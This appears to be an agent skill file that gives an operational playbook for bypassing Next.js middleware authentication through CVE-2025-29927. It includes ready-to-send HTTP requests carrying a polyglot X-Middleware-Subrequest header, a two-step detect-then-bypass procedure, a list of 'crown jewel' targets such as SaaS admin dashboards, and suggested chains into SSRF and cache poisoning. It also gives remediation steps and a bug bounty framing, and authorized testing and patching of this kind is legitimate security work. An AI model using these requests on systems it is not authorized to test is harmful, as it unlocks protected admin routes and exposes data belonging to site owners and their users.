---
name: nextjs-middleware-bypass
description: "Bypass Next.js middleware authentication using the x-middleware-subrequest header (CVE-2025-29927) and related middleware-skip tricks to reach routes whose only gate is the middleware. Use when the target runs Next.js (x-powered-by, /_next/ assets, __NEXT_DATA__) and middleware is the sole auth boundary on admin or dashboard routes."
---

# Next.js Middleware Bypass

## Crown Jewel Targets

- SaaS applications using Next.js middleware for authentication
- E-commerce platforms with Next.js frontend and middleware-enforced auth
- Admin dashboards with Next.js middleware as sole auth gate
- Next.js < 15.2.3 / < 14.2.25 / < 13.5.9 (all unpatched versions)
- Applications relying on CSP headers set in middleware
- Any Next.js app where protected routes redirect to `/login`

## Attack Surface Signals

- `x-nextjs-redirect` header in response to `X-Nextjs-Data: 1`
- Next.js indicators: `__NEXT_DATA__`, `/_next/static/`, `next.config.js`
- Middleware-enforced redirects (302/307 to `/login` on protected pages)
- `x-middleware-invoke` or `x-middleware-next` in response headers

**Source:** zhero & inzo_ (2025), SLCyber detection analysis
**CVE:** CVE-2025-29927
**Affected:** Next.js < 15.2.3, < 14.2.25, < 13.5.9

## Overview

The `x-middleware-subrequest` header is an internal Next.js header used to prevent infinite middleware recursion. By injecting this header externally, an attacker tricks Next.js into skipping middleware execution entirely — bypassing authentication, CSP, and other middleware-enforced security.

## Impact

- Authentication bypass (middleware-enforced auth skipped)
- CSP bypass (Content Security Policy headers not set)
- DoS via cache poisoning

## Exploitation

### Step 1: Detect Middleware Presence

Send `x-nextjs-data: 1` to coerce Next.js into returning internal redirect headers:

```http
GET /protected-page HTTP/2
Host: target
X-Nextjs-Data: 1
```

**Positive indicator:** Response contains `x-nextjs-redirect: /login` (HTTP 307)

### Step 2: Bypass with Polyglot Header

```http
GET /protected-page HTTP/2
Host: target
X-Nextjs-Data: 1
X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware
```

**Success:** HTTP 200 instead of 307 redirect to login.

### Why the Polyglot Works

The header must match the middleware's module path repeated enough times to exceed the recursion limit. The polyglot covers:
- `src/middleware` (src-directory projects)
- `middleware` (root-level)
- `pages/_middleware` (legacy Pages Router)
- `nowaf` segments as padding to reach threshold

## False Positive Filtering

Ignore cases where redirect is locale-based (e.g., `/foo` → `/en/foo`) — this is i18n middleware, not auth.

## Common Vulnerable Patterns

```javascript
// middleware.ts — auth enforcement that gets bypassed
export function middleware(request: NextRequest) {
  const token = request.cookies.get('session');
  if (!token) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
  return NextResponse.next();
}
```

## Detection vs Public Nuclei Templates

| Aspect | Public Checks | Correct Approach |
|--------|--------------|------------------|
| Redirect detection | Only catch rewrites | Use `x-nextjs-data: 1` to leak `x-nextjs-redirect` |
| Coverage | Rewrite-based only | Both redirect and rewrite middleware |
| False positives | No filtering | Filter locale redirects |

## Remediation

1. Upgrade Next.js to 15.2.3+, 14.2.25+, or 13.5.9+
2. WAF rule: strip `x-middleware-subrequest` from all incoming requests
3. Don't rely solely on middleware for auth — add server-side checks

## Bug Bounty Relevance

- **CRITICAL**: Auth bypass on any Next.js app using middleware for authentication
- Very common pattern in modern web apps
- Easy to test, high impact, wide attack surface

## Operator Notes (Battle-Tested)

- **Two-step detection**: First send `X-Nextjs-Data: 1` to detect middleware (look for `x-nextjs-redirect`). Then send the polyglot `X-Middleware-Subrequest` header to bypass it.
- **The polyglot header covers all layouts**: `src/middleware:nowaf:src/middleware:...middleware:...pages/_middleware` covers src-directory, root-level, and legacy Pages Router middleware locations.
- **Filter false positives**: Locale redirects (`/foo` to `/en/foo`) are i18n middleware, not auth. Only report auth-related middleware bypasses.
- **200 instead of 307 = confirmed bypass**: If the protected page returns 200 with the subrequest header instead of 307 redirect, the middleware is skipped entirely.
- **Public Nuclei templates are incomplete**: They only catch rewrite-based middleware, not redirect-based. Manual testing with `X-Nextjs-Data: 1` catches both.
- **WAF mitigation check**: Some WAFs strip `x-middleware-subrequest`. Test if the WAF is in place before reporting.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `ssrf-testing` → `references/nextjs-ssrf.md` | SSRF in Next.js API routes |
| `server-confusion-attacks` | Path confusion on Next.js proxy |
| `auth-bypass-testing` | General auth bypass methodology |
| `cache-poisoning` | Cache poisoning via middleware bypass |
| `xss-testing` → `references/prototype-pollution.md` | Prototype pollution in Next.js/Node.js |
